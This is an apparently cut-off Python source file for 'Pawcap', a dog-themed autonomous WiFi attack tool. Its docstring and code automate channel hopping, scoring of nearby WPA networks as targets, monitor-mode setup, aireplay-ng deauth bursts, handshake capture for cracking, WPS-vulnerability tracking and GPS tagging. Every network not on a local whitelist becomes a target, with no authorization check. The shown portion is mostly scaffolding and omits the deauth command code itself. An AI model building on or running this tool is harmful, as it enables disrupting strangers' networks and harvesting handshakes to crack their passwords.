#!/usr/bin/env python3
"""
Pawcap - WiFi Scanner with Auto-Deauth
Autonomous WiFi scanning with handshake capture and GPS tagging

Architecture:
  - wlan0: Management interface (SSH, web UI) - NEVER touched
  - wlan1/wlan2: USB adapters for scanning and capture in monitor mode
  
Capture workflow (per aircrack-ng docs):
  1. Scan loop hops channels discovering networks
  2. When a target is found, scan loop PAUSES channel hopping
  3. airodump-ng starts capturing on the target's channel
  4. aireplay-ng sends deauth bursts (repeated every 30s)
  5. airodump-ng captures the WPA 4-way handshake
  6. aircrack-ng verifies the handshake
  7. Capture completes, scan loop resumes channel hopping
"""

import subprocess
import threading
import queue
import time
import os
import re
import random
import shutil
import json
import glob as globmod
import collections
from datetime import datetime

try:
    from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp, sniff as scapy_sniff
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

class WiFiScanner:
    def __init__(self, config, gps_logger=None, database=None):
        self.config = config
        self.gps = gps_logger
        self.db = database
        self.interface = config['wifi']['interface']
        self.dual_mode = False
        self.scan_interface = self.interface
        self.capture_interface = self.interface
        self.capture_interface_config = config['wifi'].get('capture_interface', 'auto')
        self.running = False
        self.device_name = config['device'].get('name', 'Pawcap')
        self.whitelist = self._load_whitelist()
        
        # Performance settings
        self.max_concurrent_captures = 1  # One at a time for reliability
        self.smart_targeting = config['wifi'].get('smart_targeting', True)
        self.min_signal_strength = config['wifi'].get('min_signal_strength', -85)
        self.skip_no_clients = config['wifi'].get('skip_no_clients', True)
        
        self.stats = {
            'networks': 0,
            'handshakes': 0,
            'deauths_sent': 0,
            'packets': 0,
            'channel': 1,
            'targets_queued': 0,
            'success_rate': 0.0,
            'passive_captures': 0,
            'wps_captures': 0
        }
        
        # WPS state: bssid -> {wps_version, locked, attempted, vulnerable}
        self.wps_networks = {}
        
        self.seen_networks = {}
        self.capturing = {}
        self.capture_lock = threading.Lock()
        self.failed_bssids = {}  # Track failed captures to avoid retrying immediately
        self.scan_thread = None
        self.capture_attempts = 0
        self.capture_successes = 0
        self.activity_log = collections.deque(maxlen=100)
        self.last_handshake_time = 0
        self.last_passive_capture_time = 0
        self.last_new_network_time = 0
        
        # Smart targeting state
        self.candidates = {}  # bssid -> {network, score, channel_scanned}
        self.channel_networks = {}  # channel -> count (for congestion scoring)
        self.network_clients = {}  # bssid -> client count (persists across scans)
        self.recent_targets = collections.deque(maxlen=5)  # Recent BSSIDs to avoid re-targeting immediately
        
        # Persistent knowledge (loaded from DB on init)
        self.network_knowledge = {}  # bssid -> db row dict
        self.session_id = None
        self._knowledge_write_buffer = {}  # bssid -> network data (batched DB writes)
        self._last_cleanup = time.time()
        self.CLEANUP_INTERVAL = 600  # Memory cleanup every 10 minutes
        
        # Background passive handshake checker
        self._passive_check_queue = queue.Queue()
        self._passive_check_thread = None
        
        # Organic mode: naturalistic behavior breaks between scan cycles
        self.organic_mode = config['wifi'].get('organic_mode', True)
        self.organic_action = None  # Current organic action tuple for mood display
        
        # Parallel dual-band scanning (for dual-mode only)
        self.parallel_networks = {}  # bssid -> network data (shared between scanners)
        self.parallel_lock = threading.Lock()  # Protects parallel_networks
        self.current_5ghz_channel = None  # Track current 5GHz scanner channel for UI
        
        # Adapter hardware capabilities (populated by _detect_all_adapter_capabilities)
        self.adapter_capabilities = {}
        
        # Home channel: the channel wlan0 uses for LAN connectivity.
        # Deauths are skipped on this channel to avoid knocking ourselves offline.
        self.home_channel = None
        
        # Social mode: detect and greet nearby Pawcaps/Pwnagotchis
        self._social_mode = config['wifi'].get('social_mode', False)
        self.social_encounters = {}   # peer_id -> {name, face, signal, count, ...}
        self._social_thread = None
        self._start_time = time.time()
        
        # Find Friends mode: rapid channel hopping to discover nearby Pawcaps
        self._find_friends_mode = False
        self._find_friends_thread = None
        
        # Pack mode: coordinate with nearby Pawcaps to cover more channels
        self._pack_mode = False
        self._pack_peers = {}  # peer_name -> {channels, last_seen, lan_ip, scan_state, ...}
        self._pack_comms_thread = None
        self._deauth_claims = {}  # bssid -> timestamp
        
        # Load persistent knowledge from database
        self._load_knowledge()
        
        # Load persisted social encounters from DB
        self._load_social_encounters()
        
    @staticmethod
    def _band_for_channel(channel):
        """Return '2.4' or '5' based on channel number"""
        try:
            ch = int(channel)
        except (ValueError, TypeError):
            return '2.4'
        return '5' if ch > 14 else '2.4'

    def _update_attempted_band(self, bssid, channel):
        """Record which band a BSSID has been seen/attempted on"""
        band = self._band_for_channel(channel)
        k = self.network_knowledge.get(bssid)
        if not k:
            return
        current = k.get('attempted_bands', '') or ''
        bands = set(b for b in current.split(',') if b)
        if band not in bands:
            bands.add(band)
            new_val = ','.join(sorted(bands))
            k['attempted_bands'] = new_val
            if self.db and hasattr(self.db, 'update_attempted_bands'):
                self.db.update_attempted_bands(bssid, new_val)

    def _load_whitelist(self):
        """Load network whitelist"""
        whitelist = set()
        whitelist_file = self.config['whitelist'].get('file', '/opt/pawcap/config/whitelist.conf')
        
        if os.path.exists(whitelist_file):
            with open(whitelist_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        whitelist.add(line)
        return whitelist
    
    def _load_knowledge(self):
        """Load persistent network knowledge from database"""
        if not self.db or not hasattr(self.db, 'get_all_knowledge'):
            return
        try:
            rows = self.db.get_all_knowledge()
            for row in rows:
                bssid = row['bssid']
                self.network_knowledge[bssid] = row
                # Restore client counts from persistent storage
                if row.get('max_clients', 0) > 0:
                    self.network_clients[bssid] = row['max_clients']
            if rows:
                self._log_activity('INFO', f"Loaded knowledge for {len(rows)} networks from database")
        except Exception as e:
            print(f"Error loading network knowledge: {e}")
    
    def _detect_adapters(self):
        """Detect all USB WiFi adapters (excluding built-in interfaces)"""
        usb_adapters = []
        try:
            result = subprocess.run(['ls', '/sys/class/net'],
                                  capture_output=True, text=True, timeout=5)
            all_interfaces = result.stdout.strip().split('\n')
            wireless_interfaces = [iface for iface in all_interfaces if iface.startswith('wl')]
        except:
            self._log_activity('WARN', "Could not detect wireless interfaces!")
            return []

        for iface in wireless_interfaces:
            try:
                device_path = f"/sys/class/net/{iface}/device"
                driver_path = subprocess.run(['readlink', '-f', device_path],
                                           capture_output=True, text=True, timeout=2)
                if 'usb' in driver_path.stdout.lower():
                    usb_adapters.append(iface)
            except:
                pass

        return sorted(usb_adapters)

    def _query_adapter_capabilities(self, iface):
        """Query adapter hardware capabilities (supported bands, chipset, driver).
        Returns dict with 'bands' (list), 'chipset' (str), 'driver' (str)."""
        caps = {'bands': [], 'chipset': 'unknown', 'driver': 'unknown'}

        # Get phy name for this interface
        phy = None
        try:
            phy_path = f"/sys/class/net/{iface}/phy80211/name"
            with open(phy_path, 'r') as f:
                phy = f.read().strip()
        except:
            pass

        if phy:
            try:
                result = subprocess.run(['iw', 'phy', phy, 'info'],
                                      capture_output=True, text=True, timeout=5)
                has_24 = False
                has_5 = False
                for line in result.stdout.splitlines():
                    line = line.strip()
                    if re.match(r'\* 2\d{3}\.', line):
                        has_24 = True
                    elif re.match(r'\* 5\d{3}\.', line):
                        has_5 = True
                if has_24:
                    caps['bands'].append('2.4GHz')
                if has_5:
                    caps['bands'].append('5GHz')
            except:
                pass

        # Get chipset/product name from USB device
        try:
            device_path = os.path.realpath(f"/sys/class/net/{iface}/device")
            # Try USB product name
            product_path = os.path.join(os.path.dirname(device_path), 'product')
            if os.path.exists(product_path):
                with open(product_path, 'r') as f:
                    caps['chipset'] = f.read().strip()
        except:
            pass

        # Get driver name
        try:
            driver_link = os.path.realpath(f"/sys/class/net/{iface}/device/driver")
            caps['driver'] = os.path.basename(driver_link)
        except:
            pass

        return caps

    def _detect_home_channel(self):
        """Detect the channel wlan0 is using for LAN connectivity.
        Deauths on this channel would knock our own connection offline."""
        # Method 1: iw (available on Raspberry Pi OS)
        try:
            result = subprocess.run(
                ['iw', 'dev', 'wlan0', 'info'],
                capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    line = line.strip()
                    if line.startswith('channel '):
                        ch = int(line.split()[1])
                        self.home_channel = ch
                        self._log_activity('INFO', f"Home channel (wlan0): {ch} — deauths will be skipped on this channel")
                        return
        except FileNotFoundError:
            pass
        except Exception:
            pass

        # Method 2: nmcli (available on Debian/NetworkManager systems)
        try:
            result = subprocess.run(
                ['nmcli', '-t', '-f', 'IN-USE,CHAN', 'dev', 'wifi', 'list', 'ifname', 'wlan0'],
                capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    if line.startswith('*:'):
                        ch = int(line.split(':')[1])
                        self.home_channel = ch
                        self._log_activity('INFO', f"Home channel (wlan0): {ch} — deauths will be skipped on this channel")
                        return
        except FileNotFoundError:
            pass
        except Exception:
            pass

        self._log_activity('WARN', "Home channel unknown — deauth protection disabled")

    def _detect_all_adapter_capabilities(self):
        """Detect capabilities for all USB adapters. Populates self.adapter_capabilities."""
        self.adapter_capabilities = {}
        usb_adapters = self._detect_adapters()
        for iface in usb_adapters:
            caps = self._query_adapter_capabilities(iface)
            self.adapter_capabilities[iface] = caps
            bands_str = ' + '.join(caps['bands']) if caps['bands'] else 'unknown'
            self._log_activity('INFO',
                f"  {iface}: {caps['chipset']} ({caps['driver']}) [{bands_str}]")

    def _detect_and_validate_adapters(self):
        """Detect USB adapters and assign scan/capture roles"""
        usb_adapters = self._detect_adapters()

        if not usb_adapters:
            self._log_activity('ERROR', "No USB WiFi adapters detected!")
            self._log_activity('ERROR', "Refusing to enable monitor mode for safety.")
            return False

        self._log_activity('INFO', f"Detected USB adapters: {usb_adapters}")

        # Detect adapter hardware capabilities (bands, chipset, driver)
        self._detect_all_adapter_capabilities()

        # Explicit capture_interface from config
        cap_cfg = self.capture_interface_config
        if cap_cfg and cap_cfg != 'auto':
            if cap_cfg not in usb_adapters:
                self._log_activity('ERROR', f"Configured capture_interface '{cap_cfg}' not found in USB adapters!")
                return False
            self.scan_interface = self.interface
            self.capture_interface = cap_cfg
            self.dual_mode = (self.scan_interface != self.capture_interface)
        else:
            # Auto-detect mode
            if len(usb_adapters) == 1:
                self.scan_interface = usb_adapters[0]
                self.capture_interface = usb_adapters[0]
                self.dual_mode = False
            else:
                # Prefer configured interface for scanning, second adapter for capture
                if self.interface in usb_adapters:
                    self.scan_interface = self.interface
                    self.capture_interface = [a for a in usb_adapters if a != self.interface][0]
                elif len(usb_adapters) >= 2:
                    self.scan_interface = usb_adapters[0]
                    self.capture_interface = usb_adapters[1]
                else:
                    # Fallback: only one adapter and configured interface not found
                    self._log_activity('WARN', "Configured interface not found, falling back to single-adapter mode")
                    self.scan_interface = usb_adapters[0]
                    self.capture_interface = usb_adapters[0]
                    self.dual_mode = False
                    return True
                self.dual_mode = True

        # Validate the scan interface is in the USB list
        if self.scan_interface not in usb_adapters:
            self._log_activity('ERROR', f"Scan interface {self.scan_interface} not found in USB adapters!")
            return False

        if self.dual_mode:
            self._log_activity('SUCCESS',
                f"Dual-adapter mode: {self.scan_interface} (scanner) + {self.capture_interface} (capturer)")
        else:
            self._log_activity('INFO',
                f"Single-adapter mode: {self.scan_interface} (time-shared)")

        return True
    
    def start(self):
        """Start WiFi scanning"""
        if self.running:
            return
        
        self._log_activity('INFO', "Starting WiFi scanner...")
        
        if not self._detect_and_validate_adapters():
            self._log_activity('ERROR', "Scanner startup aborted for safety!")
            self.running = False
            return
        
        self._detect_home_channel()
        
        self.running = True
        self._enable_monitor_mode_on(self.scan_interface)
        if self.dual_mode:
            self._enable_monitor_mode_on(self.capture_interface)
        
        # Start session tracking
        if self.db and hasattr(self.db, 'start_session'):
            self.session_id = self.db.start_session()
        
        # Use parallel scanning if in dual-mode, otherwise sequential
        if self.dual_mode:
            self.scan_thread = threading.Thread(target=self._parallel_scan_loop, daemon=True)
        else:
            self.scan_thread = threading.Thread(target=self._scan_loop, daemon=True)
        self.scan_thread.start()
        
        self._passive_check_thread = threading.Thread(target=self._passive_check_worker, daemon=True)
        self._passive_check_thread.start()
        
        if self._social_mode and SCAPY_AVAILABLE and self._social_thread is None:
            self._social_thread = threading.Thread(target=self._social_worker, daemon=True)
            self._social_thread.start()
        
    def stop(self):
        """Stop WiFi scanning"""
        self._log_activity('INFO', "Stopping WiFi scanner...")
        self.running = False
        
        if self.scan_thread:
            self.scan_thread.join(timeout=10)
        
        # Wait for background passive checker to finish current batch
        if self._passive_check_thread:
            self._passive_check_thread.join(timeout=15)
        
        # Stop all captures
        with self.capture_lock:
            for bssid in list(self.capturing.keys()):
                del self.capturing[bssid]
        
        # Flush any buffered knowledge and end session
        self._flush_knowledge()
        if self.db and self.session_id and hasattr(self.db, 'end_session'):
            self.db.end_session(self.session_id, {
                'networks_seen': len(self.seen_networks),
                'handshakes_captured': self.stats['handshakes'],
                'capture_attempts': self.capture_attempts,
                'total_deauths': self.stats['deauths_sent']
            })
        
        self._disable_monitor_mode_on(self.scan_interface)
        if self.dual_mode:
            self._disable_monitor_mode_on(self.capture_interface)
        self._cleanup_temp_files()
    
    def is_running(self):
        return self.running
    
    def get_stats(self):
        self.stats['networks'] = len(self.seen_networks)
        if self.capture_attempts > 0:
            self.stats['success_rate'] = round((self.capture_successes / self.capture_attempts) * 100, 1)
        self.stats['candidates'] = len(self.candidates)
        self.stats['smart_targeting'] = self.smart_targeting
        return self.stats
    
    def get_recent_networks(self):
        """Get recently seen networks"""
        networks = []
        for bssid, data in list(self.seen_networks.items())[-20:]:
            if data['ssid'] not in self.whitelist:
                net_data = {
                    'ssid': data['ssid'],
                    'bssid': bssid,
                    'channel': data['channel'],
                    'signal': data['signal'],
                    'encryption': data.get('encryption', 'Unknown'),
                    'clients': data.get('clients', self.network_clients.get(bssid, 0)),
                    'timestamp': data['last_seen']
                }
                # Include score if smart targeting is active
                if self.smart_targeting and bssid in self.candidates:
                    net_data['score'] = self.candidates[bssid]['score']
                networks.append(net_data)
        return networks
    
    def _log_activity(self, level, message):
        """Log activity to the feed buffer and print to console"""
        entry = {
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'level': level,
            'message': message
        }
        self.activity_log.append(entry)
        print(f"[{entry['timestamp']}] [{level}] {message}")

    def get_activity_feed(self):
        """Get recent activity feed entries"""
        return list(self.activity_log)

    def get_mood(self):
        """Calculate device's current mood based on scanner activity"""
        now = time.time()

        # Cache mood to avoid spammy message swaps on every UI poll
        # Only pick a new random message if the mood state changed or cooldown expired
        if not hasattr(self, '_mood_cache'):
            self._mood_cache = {'state': None, 'result': None, 'expires': 0}

        if not self.running:
            return {'state': 'sleeping', 'face': 'U´-ᴥ-`U', 'message': 'Zzz... dreaming of treats'}

        # Determine current mood state and build result
        mood = self._compute_mood(now)

        # Return cached result if same state and not expired
        cache = self._mood_cache
        if cache['state'] == mood['state'] and now < cache['expires']:
            return cache['result']

        # New state or expired — cache the new mood
        # Longer cooldowns for states that tend to spam (frustrated, bored, hunting)
        cooldowns = {
            'excited': 10, 'sniffing': 10, 'social': 10,
            'organic': 5, 'focused': 8,
            'frustrated': 30, 'bored': 20, 'hunting': 15,
        }
        ttl = cooldowns.get(mood['state'], 10)
        self._mood_cache = {'state': mood['state'], 'result': mood, 'expires': now + ttl}
        return mood

    def _compute_mood(self, now):
        """Determine device's current mood (called by get_mood with caching)"""

        # Excited: active handshake captured in last 60 seconds
        if self.last_handshake_time and (now - self.last_handshake_time) < 60:
            excitement = [
                'Pwnd by a doggo!',
                'Dunked on like Air Bud!',
                'Who\'s a good hacker dog? Me!',
                'Bringing home the bacon!',
                'Victory is mine!',
            ]
            return {'state': 'excited', 'face': 'V●ᴥ●V', 'message': random.choice(excitement)}

        # Sniffing: passive handshake captured in last 60 seconds
        if self.last_passive_capture_time and (now - self.last_passive_capture_time) < 60:
            passive_thoughts = [
                'Mmm... something smells good!',
                'Awoooooo! Surprise friend!',
                'Free treat on the ground!',
                'Did someone drop this?',
            ]
            return {'state': 'sniffing', 'face': 'U`*ᴥ*´U', 'message': random.choice(passive_thoughts)}

        # Social: just met a friend in the last 60 seconds
        if self.social_encounters:
            latest = max(self.social_encounters.values(), key=lambda e: e.get('last_seen', 0))
            last_seen = latest.get('last_seen', 0)
            if isinstance(last_seen, (int, float)) and now - last_seen < 60:
                return {'state': 'social', 'face': 'U♥ᴥ♥U', 'message': f"New friend! *sniff sniff*"}

        # Organic mode: show current organic action
        if self.organic_action:
            name, face, message = self.organic_action
            return {'state': 'organic', 'face': face, 'message': message}

        # Focused: actively capturing a target
        with self.capture_lock:
            if self.capturing:
                cap = next(iter(self.capturing.values()))
                if cap.get('deauthing'):
                    barking = [
                        'Bark bark bark!',
                        'Woof woof woof!',
                        'Surprise!',
                        'Arf! Arf!',
                        '*aggressive tail wagging*',
                    ]
                    return {'state': 'focused', 'face': '▼・ᴥ・▼', 'message': random.choice(barking)}
                watching = [
                    '*Thousand island stare*',
                    'Is that bacon?',
                    'Lock in, son.',
                    'My ancestors were wolves, you know.',
                    'You ready for this?',
                ]
                return {'state': 'focused', 'face': 'U・ᴥ・U', 'message': random.choice(watching)}

        # Frustrated: low success rate after multiple attempts
        if self.capture_attempts >= 3:
            rate = (self.capture_successes / self.capture_attempts) * 100
            if rate < 20:
                frustrated = [
                    'This is so rigged, man.',
                    'The ball went under the couch!',
                    'Why won\'t they play?!',
                    'I\'ll get em next time!',
                    '*Angry awoooo*',
                ]
                return {'state': 'frustrated', 'face': 'U´×`U', 'message': random.choice(frustrated)}

        # Bored: no new networks in 2+ minutes
        if self.last_new_network_time and (now - self.last_new_network_time) > 120:
            bored = [
                '*yawns*',
                'ZzZzZz...',
                'So calm... so quiet...',
                'Nap time soon?',
                'Nothing to chase...',
            ]
            return {'state': 'bored', 'face': '∪´·ᴥ·`∪', 'message': random.choice(bored)}

        # Retracing: checking blacklisted SSIDs on 5GHz
        if self.stats.get('scan_phase') == '5GHz-retrace':
            return {'state': 'hunting', 'face': 'U◕ᴥ◕U', 'message': 'Did I bury a bone here?'}

        # Evaluating: smart targeting has candidates being scored
        if self.smart_targeting and len(self.candidates) > 0:
            count = len(self.candidates)
            thinking = [
                f'Hmm... {count} interesting smells',
                f'Which one, which one?',
                f'Eeny meeny miny moe...',
                f'It smell crazy in here!',
                f'So many choices!',
            ]
            return {'state': 'hunting', 'face': 'υ´•ᴥ•`υ', 'message': random.choice(thinking)}

        # Hunting: actively scanning and finding things
        hunting = [
            'On the prowl...',
            'Sniff sniff sniff',
            'Exploring the neighborhood',
            'What\'s that smell?',
            'Tracking scents...',
            'Investigating...',
            'I\'m like a bloodhound up in here!',
        ]
        return {'state': 'hunting', 'face': 'υ´•ᴥ•`υ', 'message': random.choice(hunting)}

    def _adapter_label(self, iface, role_suffix=''):
        """Build a dynamic label for an adapter using detected capabilities.
        
        Args:
            iface: Interface name (e.g. 'wlan1')
            role_suffix: Optional suffix like ' / Deauth' or ' / Capture'
        
        Returns e.g. 'Dual-Band Scanner / Deauth' or '2.4GHz Scanner'
        """
        caps = getattr(self, 'adapter_capabilities', {}).get(iface, {})
        bands = caps.get('bands', [])
        if len(bands) >= 2:
            band_label = 'Dual-Band'
        elif bands:
            band_label = bands[0]
        else:
            band_label = 'Unknown'
        return f"{band_label} Scanner{role_suffix}"

    def _adapter_hw_info(self, iface):
        """Return chipset and driver info dict for an adapter."""
        caps = getattr(self, 'adapter_capabilities', {}).get(iface, {})
        return {
            'chipset': caps.get('chipset', 'unknown'),
            'driver': caps.get('driver', 'unknown'),
            'bands': caps.get('bands', [])
        }

    def get_interface_status(self):
        """Get WiFi interface status for web UI with rich capture data"""
        interfaces = []

        if not self.running:
            iface_type = 'Scan + Capture' if not self.dual_mode else self._adapter_label(self.scan_interface)
            interfaces.append({
                'name': self.scan_interface,
                'mode': 'Managed',
                'type': iface_type,
                'status': 'inactive',
                'channel': '--',
                'target': None,
                'hw': self._adapter_hw_info(self.scan_interface)
            })
            if self.dual_mode:
                interfaces.append({
                    'name': self.capture_interface,
                    'mode': 'Managed',
                    'type': self._adapter_label(self.capture_interface),
                    'status': 'inactive',
                    'channel': '--',
                    'target': None,
                    'hw': self._adapter_hw_info(self.capture_interface)
                })
            return interfaces

        # Check if actively capturing
        with self.capture_lock:
            active_capture = None
            for bssid, cap_info in self.capturing.items():
                active_capture = {
                    'bssid': bssid,
                    'ssid': cap_info.get('ssid', 'Unknown'),
                    'channel': cap_info.get('channel', '--'),
                    'start_time': cap_info.get('start_time', time.time()),
                    'deauthing': cap_info.get('deauthing', False)
                }
                break  # Only one capture at a time

        if self.dual_mode:
            # During capture: both adapters pause scanning and coordinate attack
            # scan_interface: sends deauth packets
            # capture_interface: captures handshake packets
            if active_capture:
                elapsed = int(time.time() - active_capture['start_time'])
                interfaces.append({
                    'name': self.scan_interface,
                    'mode': 'Monitor',
                    'type': self._adapter_label(self.scan_interface, ' / Deauth'),
                    'status': 'DEAUTHING' if active_capture['deauthing'] else 'ATTACKING',
                    'channel': active_capture['channel'],
                    'target': {
                        'ssid': active_capture['ssid'],
                        'bssid': active_capture['bssid'],
                        'elapsed': elapsed,
                        'deauthing': active_capture['deauthing']
                    },
                    'hw': self._adapter_hw_info(self.scan_interface)
                })
                interfaces.append({
                    'name': self.capture_interface,
                    'mode': 'Monitor',
                    'type': self._adapter_label(self.capture_interface, ' / Capture'),
                    'status': 'CAPTURING',
                    'channel': active_capture['channel'],
                    'target': {
                        'ssid': active_capture['ssid'],
                        'bssid': active_capture['bssid'],
                        'elapsed': elapsed,
                        'deauthing': False
                    },
                    'hw': self._adapter_hw_info(self.capture_interface)
                })
            else:
                # Not capturing: both adapters scanning in parallel
                interfaces.append({
                    'name': self.scan_interface,
                    'mode': 'Monitor',
                    'type': self._adapter_label(self.scan_interface),
                    'status': 'SCANNING',
                    'channel': self.stats.get('channel', '--'),
                    'target': None,
                    'hw': self._adapter_hw_info(self.scan_interface)
                })
                interfaces.append({
                    'name': self.capture_interface,
                    'mode': 'Monitor',
                    'type': self._adapter_label(self.capture_interface),
                    'status': 'SCANNING',
                    'channel': self.current_5ghz_channel if self.current_5ghz_channel else '--',
                    'target': None,
                    'hw': self._adapter_hw_info(self.capture_interface)
                })
        else:
            # Single-adapter mode
            if active_capture:
                elapsed = int(time.time() - active_capture['start_time'])
                interfaces.append({
                    'name': self.scan_interface,
                    'mode': 'Monitor',
                    'type': 'Scan + Capture',
                    'status': 'CAPTURING',
                    'channel': active_capture['channel'],
                    'target': {
                        'ssid': active_capture['ssid'],
                        'bssid': active_capture['bssid'],
                        'elapsed': elapsed,
                        'deauthing': active_capture['deauthing']
                    },
                    'hw': self._adapter_hw_info(self.scan_interface)
                })
            else:
                interfaces.append({
                    'name': self.scan_interface,
                    'mode': 'Monitor',
                    'type': 'Scan + Capture',
                    'status': 'SCANNING',
                    'channel': self.stats.get('channel', '--'),
                    'target': None,
                    'hw': self._adapter_hw_info(self.scan_interface)
                })

        return interfaces
    
    def _kill_stale_processes(self, interface):
        """Kill any lingering aircrack-ng suite processes on an interface.
        Uses SIGKILL for reliability and verifies processes are dead."""
        tools = ['airodump-ng', 'aireplay-ng', 'hcxdumptool', 'reaver', 'wash']
        for tool in tools:
            try:
                subprocess.run(
                    ['sudo', 'pkill', '-9', '-f', f'{tool}.*{interface}'],
                    capture_output=True, timeout=3
                )
            except:
                pass
        time.sleep(0.5)
        # Verify nothing is still running on this interface
        for _ in range(3):
            try:
                result = subprocess.run(
                    ['pgrep', '-f', f'(airodump-ng|aireplay-ng|hcxdumptool).*{interface}'],
                    capture_output=True, timeout=2
                )
                if result.returncode != 0:
                    break  # No matching processes — we're clean
                # Still alive — kill harder
                subprocess.run(
                    ['sudo', 'pkill', '-9', '-f', f'(airodump-ng|aireplay-ng|hcxdumptool).*{interface}'],
                    capture_output=True, timeout=2
                )
                time.sleep(0.5)
            except:
                break

    def _verify_monitor_mode(self, iface):
        """Verify interface is actually in monitor mode"""
        try:
            result = subprocess.run(['iwconfig', iface],
                                  capture_output=True, text=True, timeout=5)
            return 'Mode:Monitor' in result.stdout
        except:
            return False

    def _enable_monitor_mode_on(self, iface):
        """Enable monitor mode on a specific USB adapter (SSH-safe)"""
        try:
            self._log_activity('INFO', f"Enabling monitor mode on {iface}...")
            
            # Kill interfering processes on THIS interface only (not airmon-ng check kill
            # which nukes ALL networking including LAN/SSH)
            self._kill_stale_processes(iface)
            # Kill wpa_supplicant only if it's holding this specific interface
            try:
                subprocess.run(['sudo', 'pkill', '-f', f'wpa_supplicant.*{iface}'],
                             capture_output=True, timeout=3)
            except:
                pass
            
            subprocess.run(['sudo', 'nmcli', 'device', 'set', iface, 'managed', 'no'],
                         capture_output=True, timeout=5)
            
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'down'],
                         capture_output=True, timeout=5)
            
            subprocess.run(['sudo', 'iw', iface, 'set', 'monitor', 'control'],
                         capture_output=True, timeout=5)
            
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'],
                         capture_output=True, timeout=5)
            
            # Verify monitor mode actually took effect
            if self._verify_monitor_mode(iface):
                self._log_activity('SUCCESS', f"Monitor mode enabled on {iface}")
            else:
                self._log_activity('WARN', f"Monitor mode may not be active on {iface} — iwconfig didn't confirm")
            
        except Exception as e:
            self._log_activity('ERROR', f"Error enabling monitor mode on {iface}: {e}")
            subprocess.run(['sudo', 'nmcli', 'device', 'set', iface, 'managed', 'yes'],
                         capture_output=True, timeout=5)
    
    def _disable_monitor_mode_on(self, iface):
        """Disable monitor mode and restore a specific interface"""
        try:
            self._log_activity('INFO', f"Disabling monitor mode on {iface}...")
            
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'down'],
                         capture_output=True, timeout=5)
            
            subprocess.run(['sudo', 'iw', iface, 'set', 'type', 'managed'],
                         capture_output=True, timeout=5)
            
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'],
                         capture_output=True, timeout=5)
            
            subprocess.run(['sudo', 'nmcli', 'device', 'set', iface, 'managed', 'yes'],
                         capture_output=True, timeout=5)
            
            self._log_activity('INFO', f"Monitor mode disabled on {iface}")
            
        except Exception as e:
            self._log_activity('ERROR', f"Error disabling monitor mode on {iface}: {e}")
    
    def _parallel_scan_loop(self):
        """Main scanning loop with parallel dual-band scanning.
        
        Architecture:
          - wlan1 (scan_interface): Continuously scans 2.4GHz channels 1-11
          - wlan2 (capture_interface): Continuously scans 5GHz channels 36-165
          - Both populate shared candidate pool
          - During capture: wlan1 = deauth, wlan2 = packet capture
        
        This provides:
          - 2x faster network discovery (parallel scanning)
          - Better 5GHz coverage (dedicated adapter)
          - More reliable captures (dedicated deauth vs capture roles)
        """
        self._log_activity('SUCCESS', 'Starting parallel dual-band scanning!')
        
        # Shared network discovery
        self.parallel_networks.clear()
        
        # Start parallel scanning threads
        scan_24ghz_thread = threading.Thread(
            target=self._scan_band_24ghz,
            daemon=True,
            name="Scanner-2.4GHz"
        )
        
        scan_5ghz_thread = threading.Thread(
            target=self._scan_band_5ghz,
            daemon=True,
            name="Scanner-5GHz"
        )
        
        scan_24ghz_thread.start()
        scan_5ghz_thread.start()
        
        # Main targeting loop
        while self.running:
            try:
                # Pause targeting while Find Friends mode is active
                if self._find_friends_mode:
                    time.sleep(1)
                    continue
                
                # Organic break
                if self.organic_mode:
                    self._organic_break()
                
                if not self.running:
                    break
                
                # Collect networks from parallel scanners
                with self.parallel_lock:
                    networks_snapshot = dict(self.parallel_networks)
                
                if not networks_snapshot:
                    time.sleep(2)
                    continue
                
                # Process networks and build candidate pool
                if self.smart_targeting:
                    self.candidates.clear()
                    for bssid, net in networks_snapshot.items():
                        self._process_network(net)
                
                # Select best target
                target = self._select_best_target()
                if target:
                    self._initiate_capture(target)
                    # Wait for capture to complete
                    time.sleep(5)
                else:
                    # No good targets, wait a bit
                    time.sleep(3)
                
                # Periodic memory cleanup
                self._cleanup_memory()
                    
            except Exception as e:
                self._log_activity('ERROR', f"Error in parallel scan loop: {e}")
                time.sleep(2)
        
        # Wait for scanner threads to finish
        scan_24ghz_thread.join(timeout=5)
        scan_5ghz_thread.join(timeout=5)
    
    def _scan_band_24ghz(self):
        """Continuously scan 2.4GHz channels on wlan1 (scan_interface).
        
        Per aircrack-ng best practices: PAUSES scanning when a capture is active.
        """
        channels_24ghz = list(range(1, 12))
        
        while self.running:
            # Pause scanning while Find Friends mode is active
            if self._find_friends_mode:
                time.sleep(1)
                continue
            
            # Check if capture is active - if so, pause scanning and kill any running scans
            with self.capture_lock:
                if len(self.capturing) > 0:
                    # Kill any airodump processes on this interface
                    try:
                        subprocess.run(['sudo', 'pkill', '-f', f'airodump-ng.*{self.scan_interface}'],
                                     capture_output=True, timeout=2)
                    except:
                        pass
                    time.sleep(2)
                    continue
            
            # Pack mode: reorder channels to prioritize uncovered ones
            scan_channels = self._pack_reorder_channels(channels_24ghz)
            
            for channel in scan_channels:
                if not self.running:
                    return
                
                # Check again before each channel
                with self.capture_lock:
                    if len(self.capturing) > 0:
                        break  # Exit channel loop, wait in outer loop
                
                # Set channel on 2.4GHz adapter (wlan1)
                try:
                    subprocess.run(
                        ['sudo', 'iw', 'dev', self.scan_interface, 'set', 'channel', str(channel)],
                        capture_output=True, timeout=2
                    )
                except:
                    pass
                
                self.stats['channel'] = channel
                self.stats['scan_phase'] = '2.4GHz'
                
                # Quick scan this channel
                networks = self._quick_scan_channel_on_interface(channel, self.scan_interface)
                
                # Add to shared pool
                with self.parallel_lock:
                    for net in networks:
                        self.parallel_networks[net['bssid']] = net
                
                time.sleep(self.config['wifi']['channel_hop_interval'])
    
    def _capture_active(self):
        """Check if a capture is active (thread-safe helper)."""
        with self.capture_lock:
            return len(self.capturing) > 0

    def _scan_band_5ghz(self):
